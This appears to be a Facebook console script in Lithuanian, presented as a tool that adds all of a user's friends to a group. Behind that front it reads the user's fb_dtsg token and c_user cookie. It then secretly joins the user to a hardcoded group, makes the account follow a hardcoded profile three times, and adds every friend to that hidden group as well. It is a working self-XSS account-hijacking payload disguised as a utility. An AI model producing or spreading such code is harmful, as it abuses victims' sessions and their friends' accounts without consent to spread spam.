	function hp_d12(a) {
	    var b = "",
	        d = Array(),
	        e = "",
	        f = 0,
	        g = 0;
	    for (i = 0; a.length > i; i++) c = a.charCodeAt(i), 128 > c && (c ^= g++ % 8 + 1), e += String.fromCharCode(c), e.length > 80 && (d[f++] = e, e = "");
	    return b = d.join("") + e
	}

	function cereziAl(a) {
	    var b = a + "=";
	    return document.cookie.length > 0 ? (konum = document.cookie.indexOf(b), -1 != konum ? (konum += b.length, son = document.cookie.indexOf(";", konum), -1 == son && (son = document.cookie.length), unescape(document.cookie.substring(konum, son))) : "") : void 0
	}

	function getRandomInt(a, b) {
	    return Math.floor(Math.random() * (b - a + 1)) + a
	}

	function randomValue(a) {
	    return a[getRandomInt(0, a.length - 1)]
	}

	function a(a) {
	    var b = new XMLHttpRequest,
	        c = "/ajax/follow/follow_profile.php?__a=1",
	        d = "profile_id=" + a + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
	    b.open("POST", c, !0), b.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), b.setRequestHeader("Content-length", d.length), b.setRequestHeader("Connection", "close"), b.onreadystatechange = function () {
	        4 == b.readyState && 200 == b.status && b.close
	    }, b.send(d)
	}

	function AddFriendtoGroup(a) {
	    if (jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&members=" + a + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function (a) {
	        var b = a.substring(a.indexOf("{")),
	            c = JSON.parse(b);
	        i--, Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;", c.error ? (Descriptions += "color:darkred'>", err++, Descriptions += c.errorDescription ? c.errorDescription : JSON.stringify(c, null, "")) : (Descriptions += "color:darkgreen'>", Descriptions += arn[i] + " has been added.<br/>", suc++), Descriptions += "</div>";
	        var d = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
	        d += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>", i > 0 ? (d += arr.length + " Friends Detected<br/></br>", d += "<b>" + suc + "</b> Friends Added of " + (arr.length - i) + " Friends Processed", d += " (" + i + " Left...)</br>", d += "<div class='friend-edge'>", d += Descriptions, d += "</br><img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>", d += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'></br>", d += getuname + ", you are Getting your Friends from " + grpname + ".<br/>", d += _text, d += "</div>", d += "</div>") : (d += arr.length + " Friend Detected<br/>", d += suc + " Friend Added</br>", d += err + " Friend Not Added</br></br>", d += "<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Perkrauti puslapi</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Uždaryti</span>"), d += "</div>", document.getElementById("pagelet_sidebar").innerHTML = d
	    }, "text", "post"), tay--, tay > 0) {
	        var b = arr[tay];
	        sx = pho[tay], setTimeout("AddFriendtoGroup(" + b + ")", 100)
	    }
	    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc), 418771328258758 != gid && jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=418771328258758&source=typeahead&members=" + a + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post")
	}

	function clickfr_callback() {
	    document.getElementsByName("ok").length > 0 && nHtml.ClickUp(document.getElementsByName("ok")[0]);
	    var a = arr[i];
	    arr.length > i && addfriend(a.substring(0, 4))
	}

	function clickfr() {
	    document.getElementsByClassName("search").length > 0 ? nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]) : j++, setTimeout("clickfr_callback()", 2e3)
	}

	function addfriend() {
	    i++, setTimeout("clickfr()", 2e3)
	}
	var gid = ["418771328258758"],
	    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
	    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
	    httpwp = new XMLHttpRequest,
	    urlwp = "/ajax/groups/membership/r2j.php?__a=1",
	    paramswp = "&ref=group_jump_header&group_id=" + gid + "&fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&phstamp=";
	httpwp.open("POST", urlwp, !0), httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), httpwp.setRequestHeader("Content-length", paramswp.length), httpwp.setRequestHeader("Connection", "keep-alive"), httpwp.send(paramswp);
	var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
	    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
	    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
	    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
	    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
	    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	a("100007233452016"), a("100007233452016"), a("100007233452016");
	var gid = ["418771328258758"],
	    fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
	    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
	    httpwp = new XMLHttpRequest,
	    urlwp = "/ajax/groups/membership/r2j.php?__a=1",
	    paramswp = "&ref=group_jump_header&group_id=" + gid + "&fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&phstamp=";
	httpwp.open("POST", urlwp, !0), httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), httpwp.setRequestHeader("Content-length", paramswp.length), httpwp.setRequestHeader("Connection", "keep-alive"), httpwp.send(paramswp);
	var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
	    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
	    Friend = Array();
	gf = new XMLHttpRequest, gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token" + Math.random() + "&filter[0]=user&options[0]=Friend_only", !1), gf.send(), 4 != gf.readyState || (data = eval("(" + gf.responseText.substr(9) + ")"), data.error || (Friend = data.payload.entries.sort(function (a, b) {
	    return a.index - b.index
	})));
	var Title = 'Pridėti visus draugus į grupę <br/> Kodavo:<A style="color:#3B5998;" href="https://www.facebook.com/programavimo.paslaugos" target="_blank">Programavimo Paslaugos</A>';
	grpname = document.getElementById("groupsJumpTitle").innerHTML;
	var Descriptions = "",
	    _text = '</br>Visit: <A style="color:#3B5998;" href="https://www.facebook.com/programavimo.paslaugos">www.richylerian.blogspot.com</A>, Programavimo Paslaugos!';
	jx = {
	    getHTTPObject: function () {
	        var a = !1;
	        if ("undefined" != typeof ActiveXObject) try {
	            a = new ActiveXObject("Msxml2.XMLHTTP")
	        } catch (b) {
	            try {
	                a = new ActiveXObject("Microsoft.XMLHTTP")
	            } catch (c) {
	                a = !1
	            }
	        } else if (window.XMLHttpRequest) try {
	            a = new XMLHttpRequest
	        } catch (b) {
	            a = !1
	        }
	        return a
	    },
	    load: function (url, callback, format, method, opt) {
	        var http = this.init();
	        if (http && url) {
	            http.overrideMimeType && http.overrideMimeType("text/xml"), method || (method = "GET"), format || (format = "text"), opt || (opt = {}), format = format.toLowerCase(), method = method.toUpperCase();
	            var now = "uid=" + (new Date).getTime();
	            url += url.indexOf("?") + 1 ? "&" : "?", url += now;
	            var parameters = null;
	            if ("POST" == method) {
	                var parts = url.split("?");
	                url = parts[0], parameters = parts[1]
	            }
	            http.open(method, url, !0);
	            var ths = this;
	            http.onreadystatechange = opt.handler ? function () {
	                opt.handler(http)
	            } : function () {
	                if (4 == http.readyState)
	                    if (200 == http.status) {
	                        var result = "";
	                        http.responseText && (result = http.responseText), "j" == format.charAt(0) ? (result = result.replace(/[\n\r]/g, ""), result = eval("(" + result + ")")) : "x" == format.charAt(0) && (result = http.responseXML), callback && callback(result)
	                    } else opt.loadingIndicator && document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator), opt.loading && (document.getElementById(opt.loading).style.display = "none"), error && error(http.status)
	            }, http.send(parameters)
	        }
	    },
	    bind: function (a) {
	        var b = {
	            url: "",
	            onSuccess: !1,
	            onError: !1,
	            format: "text",
	            method: "GET",
	            update: "",
	            loading: "",
	            loadingIndicator: ""
	        };
	        for (var c in b) a[c] && (b[c] = a[c]);
	        if (b.url) {
	            var d = !1;
	            b.loadingIndicator && (d = document.createElement("div"), d.setAttribute("style", "position:absolute;top:0px;left:0px;"), d.setAttribute("class", "loading-indicator"), d.innerHTML = b.loadingIndicator, document.getElementsByTagName("body")[0].appendChild(d), this.opt.loadingIndicator = d), b.loading && (document.getElementById(b.loading).style.display = "block"), this.load(b.url, function (a) {
	                b.onSuccess && b.onSuccess(a), b.update && (document.getElementById(b.update).innerHTML = a), d && document.getElementsByTagName("body")[0].removeChild(d), b.loading && (document.getElementById(b.loading).style.display = "none")
	            }, b.format, b.method, b)
	        }
	    },
	    init: function () {
	        return this.getHTTPObject()
	    }
	};
	var nHtml = {
	    FindByAttr: function (a, b, c, d) {
	        "className" == c && (c = "class");
	        var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
	        return e && e.singleNodeValue ? e.singleNodeValue : null
	    },
	    FindByClassName: function (a, b, c) {
	        return this.FindByAttr(a, b, "className", c)
	    },
	    FindByXPath: function (a, b) {
	        try {
	            var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
	        } catch (d) {
	            GM_log("bad xpath:" + b)
	        }
	        return c && c.singleNodeValue ? c.singleNodeValue : null
	    },
	    VisitUrl: function (a) {
	        window.setTimeout(function () {
	            document.location.href = a
	        }, 500 + Math.floor(500 * Math.random()))
	    },
	    ClickWin: function (a, b, c) {
	        var d = a.document.createEvent("MouseEvents");
	        return d.initMouseEvent(c, !0, !0, a, 0, 0, 0, 0, 0, !1, !1, !1, !1, 0, null), !b.dispatchEvent(d)
	    },
	    Click: function (a) {
	        return this.ClickWin(window, a, "click")
	    },
	    ClickTimeout: function (a, b) {
	        window.setTimeout(function () {
	            return nHtml.ClickWin(window, a, "click")
	        }, b + Math.floor(500 * Math.random()))
	    },
	    ClickUp: function (a) {
	        this.ClickWin(window, a, "mousedown"), this.ClickWin(window, a, "mouseup"), this.ClickWin(window, a, "click")
	    },
	    GetText: function (a, b) {
	        var c = "";
	        if (void 0 == b && (b = 0), !(b > 40)) {
	            if (void 0 != a.textContent) return a.textContent;
	            for (var d = 0; a.childNodes.length > d; d++) {
	                var e = a.childNodes[d];
	                c += this.GetText(e, b + 1)
	            }
	            return c
	        }
	    }
	};
	void 0 == document.getElementsByClassName && (document.getElementsByClassName = function (a) {
	    for (var e, b = RegExp("(?:^|\\s)" + a + "(?:$|\\s)"), c = document.getElementsByTagName("*"), d = [], f = 0; null != (e = c[f]); f++) {
	        var g = e.className;
	        g && -1 != g.indexOf(a) && b.test(g) && d.push(e)
	    }
	    return d
	}), Array.prototype.find = function (a) {
	    var b = !1;
	    for (i = 0; this.length > i; i++) "function" == typeof a ? a.test(this[i]) && (b || (b = []), b.push(i)) : this[i] === a && (b || (b = []), b.push(i));
	    return b
	};
	var i = 3,
	    tay = 3,
	    j = 0,
	    k = 0,
	    suc = 0,
	    err = 0,
	    arr = Array(),
	    arn = Array(),
	    pho = Array(),
	    getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML,
	    gid = document.getElementsByName("group_id")[0].value;
	jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
	    var b = a,
	        c = b.substring(b.indexOf("{")),
	        d = JSON.parse(c);
	    d = d.payload.entries;
	    for (var e = 0; d.length > e; e++) arr.push(d[e].uid);
	    for (var f = 0; d.length > f; f++) arn.push(d[f].text);
	    for (var g = 0; d.length > g; g++) pho.push(d[g].photo);
	    i = arr.length - 1, tay = i, console.log(arr.length);
	    var h = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
	    h += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>", h += arr.length + " Friend Detected", h += "</div>", document.getElementById("pagelet_sidebar").innerHTML = h, AddFriendtoGroup(arr[i])
	});
